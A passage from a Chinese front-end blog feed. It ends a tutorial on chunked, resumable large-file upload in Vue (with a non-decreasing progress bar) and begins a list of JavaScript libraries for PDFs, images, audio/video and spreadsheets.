class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    +       <span class="attr">percentage</span>: uploadedList.<span class="title function_">includes</span>(index) ? <span class="number">100</span> : <span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>uploadedList 会返回已上传的切片，在遍历所有切片时判断当前切片是否在已上传列表里即可<br><a name="5zH8x"></a></p><h3 id="文件进度条-1"><a href="#文件进度条-1" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>之前说到文件进度条是一个计算属性，根据所有切片的上传进度计算而来，这就遇到了一个问题<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300751-3d3e923f-9638-4755-9d41-66ecff57f507.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300751-3d3e923f-9638-4755-9d41-66ecff57f507.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />当点击恢复时，由于重新创建了 xhr 导致切片进度清零，所以总进度条就会倒退<br />解决方案是创建一个“假”的进度条，这个假进度条基于文件进度条，但只会停止和增加，然后给用户展示这个假的进度条<br />这里我们使用 Vue 的监听属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">      <span class="attr">fakeUploadPercentage</span>: <span class="number">0</span></span><br><span class="line">&#125;),</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">  <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">      .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">      .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">      <span class="title function_">uploadPercentage</span>(<span class="params">now</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (now &gt; <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span> = now;</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当 uploadPercentage 即真的文件进度条增加时，fakeUploadPercentage 也增加，一旦文件进度条后退，假的进度条只需停止即可<br />至此一个大文件上传 + 断点续传的解决方案就完成了<br><a name="93wr5"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大文件上传</p><ul><li>前端上传大文件时使用 Blob.prototype.slice 将文件切片，并发上传多个切片，最后发送一个合并的请求通知服务端合并切片</li><li>服务端接收切片并存储，收到合并请求后使用流将切片合并到最终文件</li><li>原生 XMLHttpRequest 的 upload.onprogress 对切片上传进度的监听</li><li>使用 Vue 计算属性根据每个切片的进度算出整个文件的上传进度</li></ul><p>断点续传</p><ul><li>使用 spark-md5 根据文件内容算出文件 hash</li><li>通过 hash 可以判断服务端是否已经上传该文件，从而直接提示用户上传成功（秒传）</li><li>通过 XMLHttpRequest 的 abort 方法暂停切片的上传</li><li>上传前服务端返回已经上传的切片名，前端跳过这些切片的上传<br><a name="tYWqU"></a></li></ul><h1 id="反馈的问题"><a href="#反馈的问题" class="headerlink" title="反馈的问题"></a>反馈的问题</h1><p>部分功能由于不方便测试，这里列出评论区收集到的一些问题，有兴趣的朋友可以提出你的想法&#x2F;写个 demo 进一步交流</p><ul><li>没有做切片上传失败的处理</li><li>使用 web socket 由服务端发送进度信息</li><li>打开页面没有自动获取上传切片，而需要主动再次上传一次后才显示<br><a name="vczKu"></a></li></ul><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>源代码增加了一些按钮的状态，交互更加友好，文章表达比较晦涩的地方可以跳转到源代码查看<br /><a href="https://github.com/yeyan1996/file-upload">file-upload</a></p><p><a name="toFhM"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://juejin.im/post/5da14778f265da5bb628e590">写给新手前端的各种文件上传攻略，从小图片到大文件断点续传</a><br /><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob/slice">Blob.slice</a></p><p><a href="https://juejin.im/post/5dff8a26e51d4558105420ed">https://juejin.im/post/5dff8a26e51d4558105420ed</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 大文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件处理库</title>
      <link href="/2022/02/19/frontend/collection/wheel/wen-jian-chu-li-ku/"/>
      <url>/2022/02/19/frontend/collection/wheel/wen-jian-chu-li-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475987133-286486e5-844e-4459-b79b-f49d1cba4619.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475987133-286486e5-844e-4459-b79b-f49d1cba4619.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="SCtXi"></a></p><h1 id="1-PDF"><a href="#1-PDF" class="headerlink" title="1. PDF"></a>1. PDF</h1><p><a name="bgIJx"></a></p><h2 id="（1）PDF-js"><a href="#（1）PDF-js" class="headerlink" title="（1）PDF.js"></a>（1）PDF.js</h2><p>PDF.js 是使用 HTML5 构建的可移植文档格式 (PDF) 查看器。它由社区驱动并受 Mozilla 支持，目标是创建一个通用的、基于 Web 标准的平台来解析和呈现 PDF。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657462054009-7480ac84-c28e-4909-8bc9-b68eb38206ad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657462054009-7480ac84-c28e-4909-8bc9-b68eb38206ad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="R5YQW"></a></p><h2 id="（2）jsPDF"><a href="#（2）jsPDF" class="headerlink" title="（2）jsPDF"></a>（2）jsPDF</h2><p>jsPDF 是一个使用 JavaScript 语言生成 PDF 的开源库，是一个用于生成 PDF 的领先的 HTML5 客户端解决方案。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657462911906-fe4483d1-dde4-416b-b7f0-4cb6b69c4b41.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657462911906-fe4483d1-dde4-416b-b7f0-4cb6b69c4b41.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="XMA9o"></a></p><h2 id="（3）pdfmake"><a href="#（3）pdfmake" class="headerlink" title="（3）pdfmake"></a>（3）pdfmake</h2><p>在纯 JavaScript 中用于服务器端和客户端的 PDF 文档生成库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657463503527-9a884951-1607-41ab-abb2-d2e771d67685.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657463503527-9a884951-1607-41ab-abb2-d2e771d67685.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="fOlFT"></a></p><h2 id="（4）pdf-lib"><a href="#（4）pdf-lib" class="headerlink" title="（4）pdf-lib"></a>（4）pdf-lib</h2><p>pdf-lib 可以在任何 JavaScript 环境中创建和修改 PDF 文档。它旨在解决 JavaScript 生态系统对 PDF 操作（尤其是 PDF 修改）缺乏强大支持的问题。可以用于任何现代 JavaScript 运行时，如 Node、Browser、Deno 和 React Native 等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657464689492-3b177db2-cee9-41d6-8ffc-8bd2b44a2cd1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657464689492-3b177db2-cee9-41d6-8ffc-8bd2b44a2cd1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="PhJsV"></a></p><h2 id="（5）pdfkit"><a href="#（5）pdfkit" class="headerlink" title="（5）pdfkit"></a>（5）pdfkit</h2><p>PDFKit 是一个用于 Node 和浏览器的 PDF 文档生成库，可以轻松创建复杂的多页可打印文档。API 包含可链接性，并包括低级功能以及更高级别功能的抽象。PDFKit API 的设计很简单，因此生成复杂的文档通常只需几个函数调用即可。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657466430038-5ca36f4e-4545-4170-ac1c-444ec2a64178.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657466430038-5ca36f4e-4545-4170-ac1c-444ec2a64178.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="cCWP1"></a></p><h2 id="（6）react-pdf"><a href="#（6）react-pdf" class="headerlink" title="（6）react-pdf"></a>（6）react-pdf</h2><p>react-pdf 是一个用于在浏览器和服务器上创建 PDF 文件的 React 渲染器。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657466736878-9b0118ac-e15c-4b26-b1ba-f0cb6a1acb17.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657466736878-9b0118ac-e15c-4b26-b1ba-f0cb6a1acb17.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="USiuc"></a></p><h1 id="2-图片"><a href="#2-图片" class="headerlink" title="2. 图片"></a>2. 图片</h1><p><a name="vRH4Y"></a></p><h2 id="（1）sharp"><a href="#（1）sharp" class="headerlink" title="（1）sharp"></a>（1）sharp</h2><p>sharp 是一个高性能的 Node.js 图像处理库，调整 JPEG、PNG、WebP、AVIF 和 TIFF 图像大小的最快模块。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657467735827-7527b2f3-8471-4c97-a84c-1900fd3ef594.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657467735827-7527b2f3-8471-4c97-a84c-1900fd3ef594.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Wuc0D"></a></p><h2 id="（2）cropperjs"><a href="#（2）cropperjs" class="headerlink" title="（2）cropperjs"></a>（2）cropperjs</h2><p>cropperjs 是一个 JavaScript 图像裁剪器，支持 29 个裁剪选项、27 种方法、6 个事件、缩放、旋转等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657467979410-53c12b48-bdfb-4257-a409-5fe0f1e2cb8a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657467979410-53c12b48-bdfb-4257-a409-5fe0f1e2cb8a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="COSjr"></a></p><h2 id="（3）tui-image-editor"><a href="#（3）tui-image-editor" class="headerlink" title="（3）tui.image-editor"></a>（3）tui.image-editor</h2><p>tui.image-editor 是一个使用 HTML5 Canvas 的全功能图像编辑器。它易于使用并提供强大的过滤器。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470118701-f578d232-862e-4979-8f85-2127f5ed383e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470118701-f578d232-862e-4979-8f85-2127f5ed383e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="UpEt9"></a></p><h2 id="（4）compressorjs"><a href="#（4）compressorjs" class="headerlink" title="（4）compressorjs"></a>（4）compressorjs</h2><p>JavaScript 图像压缩器。使用浏览器原生的 canvas.toBlob API 来做压缩工作，即<strong>有损压缩</strong>，<strong>异步</strong>压缩，在不同的浏览器有<strong>不同的压缩效果</strong>。一般在客户端上传之前使用这个来预压缩图片。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470473998-eef98daf-f592-48ef-a6df-7a61faf1b993.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470473998-eef98daf-f592-48ef-a6df-7a61faf1b993.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="RIzaU"></a></p><h2 id="（5）viewerjs"><a href="#（5）viewerjs" class="headerlink" title="（5）viewerjs"></a>（5）viewerjs</h2><p>viewerjs 是一个 JavaScript 图像查看器，支持 52 个查看选项、23 种操作方法、17 个事件、旋转、移动、缩放等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470620499-aabeb917-4a5e-4c94-ab74-6a3138c504f1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657470620499-aabeb917-4a5e-4c94-ab74-6a3138c504f1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="sndoJ"></a></p><h2 id="（6）omagesloaded"><a href="#（6）omagesloaded" class="headerlink" title="（6）omagesloaded"></a>（6）omagesloaded</h2><p>omagesloaded 是一个用来检查图像何时加载的 JavaScript 库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657471110588-c5c5e359-f553-46c4-b4f2-1835344fc9ef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657471110588-c5c5e359-f553-46c4-b4f2-1835344fc9ef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="jP85V"></a></p><h1 id="3-音视频"><a href="#3-音视频" class="headerlink" title="3. 音视频"></a>3. 音视频</h1><p><a name="pjgYP"></a></p><h2 id="（1）video-js"><a href="#（1）video-js" class="headerlink" title="（1）video.js"></a>（1）video.js</h2><p>Video.js 是一个为 HTML5 世界从头开始构建的网络视频播放器。它支持 HTML5 视频和媒体源扩展，以及其他播放技术，如 YouTube 和 Vimeo（通过插件）。它支持在台式机和移动设备上播放视频。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657471942627-408eba4b-d082-471a-b3b4-f0efacb7f8cd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657471942627-408eba4b-d082-471a-b3b4-f0efacb7f8cd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Fr7fR"></a></p><h2 id="（2）plyr"><a href="#（2）plyr" class="headerlink" title="（2）plyr"></a>（2）plyr</h2><p>Plyr 是一个简单、轻量级、可访问和可定制的 HTML5、YouTube 和 Vimeo 媒体播放器，支持现代浏览器。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657472049651-78b61867-72c5-4c3a-87ce-ec90030b6ea9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657472049651-78b61867-72c5-4c3a-87ce-ec90030b6ea9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="XricI"></a></p><h2 id="（3）MediaElement-js"><a href="#（3）MediaElement-js" class="headerlink" title="（3）MediaElement.js"></a>（3）MediaElement.js</h2><p>MediaElement.js 是一个 HTML5 <audio> 或 <video> 播放器，支持 MP4、WebM 和 MP3 以及 HLS、Dash、YouTube、Facebook、SoundCloud 等，具有通用 HTML5 MediaElement API，可在所有浏览器中实现一致的 UI。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657474380271-9f1985bd-8b0d-4c1e-835c-475e07e645ff.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657474380271-9f1985bd-8b0d-4c1e-835c-475e07e645ff.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Mg1IY"></a></p><h2 id="（4）xgplayer"><a href="#（4）xgplayer" class="headerlink" title="（4）xgplayer"></a>（4）xgplayer</h2><p>西瓜播放器是一个 Web 视频播放器类库，它本着一切都是组件化的原则设计了独立可拆卸的 UI 组件。更重要的是它不只是在 UI 层有灵活的表现，在功能上也做了大胆的尝试：摆脱视频加载、缓冲、格式支持对 video 的依赖。尤其是在 mp4 点播上做了较大的努力，让本不支持流式播放的 mp4 能做到分段加载，这就意味着可以做到清晰度无缝切换、加载控制、节省视频流量。同时，它也集成了对 flv、hls、dash 的点播和直播支持。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657474785135-58850b84-8d64-4369-bec6-e8fad6a12324.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657474785135-58850b84-8d64-4369-bec6-e8fad6a12324.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ahc2Y"></a></p><h2 id="（5）DPlayer"><a href="#（5）DPlayer" class="headerlink" title="（5）DPlayer"></a>（5）DPlayer</h2><p>DPlayer 是一款可爱的 HTML5 弹幕视频播放器，可帮助人们轻松构建视频和弹幕。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475030777-0158c4ce-8b7f-47ec-8ced-c6b42c886561.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475030777-0158c4ce-8b7f-47ec-8ced-c6b42c886561.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="oGCb6"></a></p><h2 id="（6）Howler-js"><a href="#（6）Howler-js" class="headerlink" title="（6）Howler.js"></a>（6）Howler.js</h2><p>howler.js 是一个现代 web 音频库。它默认为 Web Audio API 并回退到 HTML5 Audio。这使得在所有平台上使用 JavaScript 处理音频变得容易且可靠。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475185845-b716fd84-288a-4d30-b6b0-a25d414e0470.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475185845-b716fd84-288a-4d30-b6b0-a25d414e0470.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="tGLJ3"></a></p><h1 id="4-表格"><a href="#4-表格" class="headerlink" title="4. 表格"></a>4. 表格</h1><p><a name="TECiK"></a></p><h2 id="（1）Handsontable"><a href="#（1）Handsontable" class="headerlink" title="（1）Handsontable"></a>（1）Handsontable</h2><p>Handsontable 是一个具有电子表格外观的 JavaScript 数据网格组件。适用于 React、Angular 和 Vue。它结合了数据网格功能和类似电子表格的 UX。它提供数据绑定、数据验证、过滤、排序和 CRUD 操作。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475321627-76340bd7-4945-4ed6-b264-1d21407149e2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475321627-76340bd7-4945-4ed6-b264-1d21407149e2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hxqQt"></a></p><h2 id="（2）ag-grid"><a href="#（2）ag-grid" class="headerlink" title="（2）ag-grid"></a>（2）ag-grid</h2><p>AG Grid 是一个功能齐全且高度可定制的 JavaScript 数据网格。它提供了出色的性能，没有第三方依赖，并且可以与所有主要的 JavaScript 框架顺利集成。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475416320-cda2c2fb-dc15-4e43-b2b8-964da68955ab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657475416320-cda2c2fb-dc15-4e43-b2b8-964da68955ab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hGmxF"></a></p><h2 id="（3）x-spreadsheet"><a href="#（3）x-spreadsheet" class="headerlink" title="（3）x-spreadsheet"></a>（3）x-spreadsheet</h2><p>x-spreadsheet 是一个基于 Web 的 JavaScript（canvas）电子表格。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476078361-e291876e-157f-4d5c-a230-47a6c867dcc0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476078361-e291876e-157f-4d5c-a230-47a6c867dcc0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="pM7eq"></a></p><h2 id="（4）cheetah-grid"><a href="#（4）cheetah-grid" class="headerlink" 